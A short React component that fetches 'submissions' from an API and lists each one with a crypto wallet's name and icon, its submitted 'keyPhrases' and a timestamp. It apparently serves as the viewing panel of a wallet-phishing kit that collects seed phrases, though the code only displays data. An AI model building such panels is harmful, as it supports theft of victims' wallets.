import React, { useState, useEffect } from "react";

const SubmissionsPage = () => {
  const [submissions, setSubmissions] = useState([]);

  useEffect(() => {
    const fetchSubmissions = async () => {
      try {
        const response = await fetch("/api/submissions");
        const data = await response.json();
        setSubmissions(data.submissions);
      } catch (error) {
        console.error("Error fetching submissions:", error);
      }
    };

    fetchSubmissions();
  }, []);

  return (
    <div className="submissions-container">
      <h2>Submissions</h2>
      {submissions.length === 0 ? (
        <p>No submissions found.</p>
      ) : (
        submissions.map((submission, index) => (
          <div key={index} className="submission-card">
            <div className="wallet-info">
              <img src={submission.wallet.icon} alt={submission.wallet.name} />
              <h3>{submission.wallet.name}</h3>
            </div>
            <p>{submission.keyPhrases}</p>
            <small>{new Date(submission.timestamp).toLocaleString()}</small>
          </div>
        ))
      )}
    </div>
  );
};

export default SubmissionsPage;
